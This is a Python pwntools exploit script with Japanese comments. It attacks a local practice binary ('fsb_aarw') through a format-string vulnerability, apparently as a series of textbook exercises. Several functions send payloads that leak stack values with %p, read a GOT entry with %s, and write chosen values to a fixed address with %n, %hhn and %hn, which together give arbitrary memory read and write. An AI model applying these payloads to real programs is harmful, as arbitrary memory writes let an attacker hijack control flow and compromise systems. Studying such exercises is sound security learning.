#!/usr/bin/env python3

# gdbを使用するため、リモート接続してGUI画面上で実行すること

# $ python3 ./exploit_fsb_aarw.py

from pwn import *
import sys
import struct

bin_file = './fsb_aarw'
binf = ELF(bin_file)

libc = binf.libc
offset_libc_setbuf    = libc.functions['setbuf'].address	# libcのsetbuf()のアドレス

# GDBスクリプト（起動時に実行されるコマンド）
gdb_script = '''
continue
'''

# ユーザの入力の位置確認
def attack_35_19(conn, **kwargs):
    exploit = 'aaaaaaaa %p %p %p %p %p %p %p %p %p'
    conn.sendline(exploit)
    print(conn.recvall().decode())

# 設定した値の確認
def attack_35_20(conn, **kwargs):
    exploit = b'%9$p'.ljust(8, b'\x00')
    exploit += struct.pack('<Q', 0x404020)
    conn.sendline(exploit)
    print(conn.recvall().decode())

# GOTの読み出し（%sをつけて読み出す）
def attack_35_21(conn, **kwargs):
    exploit = b'%9$s'.ljust(8, b'\x00')
    exploit += struct.pack('<Q', 0x404020)
    conn.sendline(exploit)
    print(conn.recvall().hex())

# 0x404028番地に、0x102(4byte)書き込み
def attack_35_23(conn, **kwargs):
    # 258=0x102。%258cで、0x102文字出力し、%10$nで10個目の引数に出力文字数0x102を書き込み
    exploit = b'%258c%10$n'.ljust(0x10, b'\x00')
    exploit += struct.pack('<Q', 0x404028)
    conn.sendline(exploit)
    conn.recvall()

# 0x404028番地に、0x12345678(4byte)書き込み
def attack_35_24(conn, **kwargs):
    # 305419896=0x12345678。%305419896cで、0x12345678文字出力し、%10$nで10個目の引数に出力文字数0x12345678書き込み (※出力文字数が多いので、時間かかる)
    exploit = b'%305419896c%10$n'.ljust(0x10, b'\x00')
    exploit += struct.pack('<Q', 0x404028)
    conn.sendline(exploit)
    conn.recvall()

# 0x404028番地に、0x12345678(8byte)書き込み
def attack_35_26(conn, **kwargs):
    exploit = b'%18c%17$hhn%34c%16$hhn%34c%15$hhn%34c%14$hhn'.ljust(0x30, b'\x00')
    exploit += struct.pack('<QQQQ', 0x404028, 0x404029, 0x40402A, 0x40402B)
    conn.sendline(exploit)
    conn.recvall()

# 0x404028番地に、0x12345678(8byte)書き込み
def attack_35_27(conn, **kwargs):
    exploit = b'%13$ln%86c%14$hhn%34c%13$hhn%4540c%15$hn'.ljust(0x28,b'\x00')
    exploit += struct.pack('<QQQ', 0x404028, 0x404029, 0x40402A)
    conn.sendline(exploit)
    conn.recvall()

def main():
    conn = process(bin_file)
    attack_35_19(conn)
    
    conn = process(bin_file)
    attack_35_20(conn)
    
    conn = process(bin_file)
    attack_35_21(conn)
    
    conn = gdb.debug(bin_file, gdbscript=gdb_script)
    attack_35_23(conn)
    
    conn = gdb.debug(bin_file, gdbscript=gdb_script)
    attack_35_24(conn)
    
    conn = gdb.debug(bin_file, gdbscript=gdb_script)
    attack_35_26(conn)
    
    conn = gdb.debug(bin_file, gdbscript=gdb_script)
    attack_35_27(conn)
    
if __name__=='__main__':
    main()
